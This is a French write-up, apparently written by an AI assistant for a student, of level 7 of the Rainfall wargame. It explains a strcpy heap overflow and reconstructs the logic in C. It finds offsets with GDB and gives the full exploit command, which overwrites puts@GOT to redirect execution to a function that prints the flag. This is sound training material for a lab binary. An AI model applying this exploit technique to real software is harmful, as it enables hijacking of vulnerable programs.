Parfait, voici **un rapport “équilibré”**, dans l’esprit des **rapports précédents Rainfall** :

* **ASM + commandes GDB** pour montrer comment les infos sont trouvées
* **équivalent C lisible** pour comprendre la logique
* **explications continues**, sans rupture, sans “tu”, prêt à être rendu

---

# Rainfall – Level 7

## Objectif

Analyser le binaire `level7` afin d’exploiter une vulnérabilité sur le tas permettant de détourner l’exécution du programme et d’afficher le contenu du fichier contenant le flag du niveau suivant.

---

## Reconnaissance initiale

La liste des fonctions présentes dans le binaire permet d’identifier rapidement les points d’intérêt :

```bash
(gdb) info functions
```

Fonctions notables :

* `malloc`, `strcpy`, `fopen`, `fgets`, `puts`
* une fonction interne `m`, non appelée explicitement dans `main`

La présence de `strcpy` combinée à des allocations dynamiques de petite taille suggère une vulnérabilité de type heap overflow.

---

## Analyse de la fonction `main` (assembleur)

```bash
(gdb) disas main
```

Les premières instructions montrent quatre allocations successives :

```asm
movl $0x8,(%esp)
call malloc
```

répétées quatre fois. Chaque `malloc(8)` retourne une adresse stockée soit sur la stack, soit dans une structure précédemment allouée.

Les instructions suivantes sont caractéristiques :

```asm
movl $0x1,(%eax)
mov %edx,0x4(%eax)
```

Cela indique que chaque bloc de 8 octets est utilisé comme une structure contenant :

* un entier sur les 4 premiers octets
* un pointeur sur les 4 suivants

---

## Interprétation en C (structure logique)

```c
typedef struct s_node {
    int   id;
    char *buf;
} t_node;
```

Organisation mémoire sur le tas :

```
malloc1 : [ id=1 ][ ptr -> malloc2 ]
malloc2 : [ buffer (8 octets) ]

malloc3 : [ id=2 ][ ptr -> malloc4 ]
malloc4 : [ buffer (8 octets) ]
```

---

## Point critique : copies non protégées

Dans `main`, deux appels à `strcpy` sont effectués :

```asm
call strcpy@plt   ; argv[1] -> malloc2
call strcpy@plt   ; argv[2] -> malloc4 (via pointeur)
```

Équivalent C :

```c
strcpy(n1->buf, argv[1]);
strcpy(n2->buf, argv[2]);
```

Les buffers font **8 octets**, mais `strcpy` ne vérifie pas la taille : un débordement sur le tas est possible.

---

## Analyse dynamique du tas avec GDB

Des breakpoints sont placés juste après certains `malloc` pour observer les adresses retournées dans `%eax` :

```bash
(gdb) break *0x08048550
(gdb) break *0x08048565
(gdb) run AAA BBB
(gdb) info registers
```

Adresses observées :

```
malloc2 = 0x0804a018
malloc3 = 0x0804a028
```

La différence est de :

```
0x0804a028 - 0x0804a018 = 0x10 (16 octets)
```

Pour atteindre le champ `buf` de `malloc3` depuis `malloc2` :

* 16 octets pour atteindre la structure suivante
* +4 octets pour dépasser le champ `id`

Soit **20 octets** avant d’écraser le pointeur cible.

---

## Vulnérabilité exploitée : write-what-where

Le premier `strcpy` permet d’écraser `malloc3->buf`.

Le second `strcpy` devient alors :

```c
strcpy(corrupted_pointer, argv[2]);
```

Ce mécanisme constitue une primitive **write-what-where** :

* **where** : contrôlé via `argv[1]`
* **what** : contenu de `argv[2]`

---

## Choix de la cible : GOT de `puts`

La fin de `main` est la suivante :

```asm
call fopen
call fgets
call puts
```

* `fopen` ouvre le fichier
* `fgets` lit le flag dans un buffer global (`0x8049960`)
* `puts` est appelé ensuite

Le buffer global utilisé par `fgets` est visible dans les arguments :

```bash
(gdb) disas main
# movl $0x8049960,(%esp)
# call fgets@plt
```

La fonction `m` affiche ce même buffer :

```bash
(gdb) disas m
# printf(fmt, 0x8049960, time())
```

Il est donc nécessaire de **laisser s’exécuter `fopen` et `fgets`**, puis de détourner l’exécution **au moment de `puts`**.

L’entrée GOT de `puts` est identifiée via :

```bash
(gdb) disas puts
```

```asm
jmp *0x8049928
```

Adresse retenue :

```
puts@got = 0x08049928
```

Adresse de la fonction `m` :

```bash
(gdb) info address m
```

```
m = 0x080484f4
```

---

## Exploitation

### 1. Écrasement de `malloc3->buf`

Payload `argv[1]` :

```bash
python -c 'print("A"*20 + "\x28\x99\x04\x08")'
```

Ce payload force :

```
malloc3->buf = puts@got
```

### 2. Écriture de l’adresse de `m` dans la GOT

Payload `argv[2]` :

```bash
python -c 'print("\xf4\x84\x04\x08")'
```

Le second `strcpy` effectue alors :

```
*(puts@got) = &m
```

### Exécution finale

```bash
./level7 $(python -c 'print("A"*20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
```

L’appel final à `puts("~~")` est redirigé vers `m`, qui affiche le contenu du buffer global : le flag.

---

## Conclusion

Le niveau 7 repose sur un **heap overflow** permettant la corruption d’un pointeur dans une structure adjacente. Cette corruption transforme un second `strcpy` en primitive **write-what-where**, exploitée pour écraser l’entrée GOT de `puts` et rediriger l’exécution vers une fonction interne `m`, appelée après la lecture du flag en mémoire.

Ce niveau illustre :

* l’impact des copies non bornées sur le tas
* l’importance de l’ordre des appels
* le rôle central de la GOT dans le détournement de flot sur ELF non protégés

---
